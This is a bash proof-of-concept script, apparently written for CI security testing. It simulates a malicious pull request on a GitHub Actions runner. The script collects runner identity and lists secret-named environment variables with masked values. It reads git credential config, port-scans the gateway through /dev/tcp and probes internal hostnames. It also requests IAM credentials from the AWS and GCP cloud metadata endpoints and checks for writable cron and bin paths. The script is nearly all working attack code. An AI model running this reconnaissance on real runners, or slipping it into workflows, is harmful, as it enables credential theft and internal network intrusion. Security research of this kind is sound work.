#!/bin/bash
echo "=== PoC #6: Runner Environment Secrets Leakage & Network Pivot Probe ==="
echo "[*] Simulating: malicious PR harvesting runner env secrets + internal network recon"
echo "[*] Read-only probe — no exfiltration or lateral movement performed"
echo ""

echo "[+] System info:"
uname -a
cat /etc/os-release 2>/dev/null | head -5
echo ""

echo "[+] Runner identity & groups:"
whoami && id
groups 2>/dev/null
echo ""

echo "[+] GitHub Actions context variables:"
echo "  GITHUB_REPOSITORY=$GITHUB_REPOSITORY"
echo "  GITHUB_RUN_ID=$GITHUB_RUN_ID"
echo "  GITHUB_ACTOR=$GITHUB_ACTOR"
echo "  GITHUB_WORKFLOW=$GITHUB_WORKFLOW"
echo "  RUNNER_NAME=$RUNNER_NAME"
echo "  RUNNER_OS=$RUNNER_OS"
echo ""

echo "[+] Secrets in environment (redacted values):"
env | sort | grep -Ei 'token|secret|key|password|cred|auth|api_key|private' | sed -E 's/=(.{0,4}).*/=\1***MASKED***/'
echo ""

echo "[+] Runner home directory structure:"
ls -la ~ 2>/dev/null | head -15
echo ""

echo "[+] Git configuration (potential credential helpers):"
git config --global --list 2>/dev/null
cat ~/.gitconfig 2>/dev/null
echo ""

echo "[+] Internal network scan (common service ports on gateway):"
GATEWAY=$(ip route show default 2>/dev/null | awk '/default/ {print $3}')
echo "  Gateway: $GATEWAY"
for port in 22 80 443 8080 3306 5432 6379 9090; do
  timeout 2 bash -c "echo >/dev/tcp/$GATEWAY/$port" 2>/dev/null && echo "  $GATEWAY:$port OPEN" || echo "  $GATEWAY:$port closed/filtered"
done
echo ""

echo "[+] DNS resolution for internal services:"
for host in registry.internal gitlab.internal jenkins.internal harbor.internal; do
  result=$(getent hosts "$host" 2>/dev/null)
  [ -n "$result" ] && echo "  $host -> $result" || echo "  $host -> not resolvable"
done
echo ""

echo "[+] Cloud IMDS token fetch attempt (read-only):"
curl -sk --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo "  AWS IMDS IAM role: not available"
curl -sk --max-time 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email 2>/dev/null || echo "  GCP service account: not available"
echo ""

echo "[+] Writable sensitive paths:"
for p in /etc/cron.d /etc/cron.daily /usr/local/bin /opt; do
  [ -w "$p" ] && echo "  WRITABLE: $p" || echo "  read-only: $p"
done
echo ""

echo "=== End PoC #6 ==="
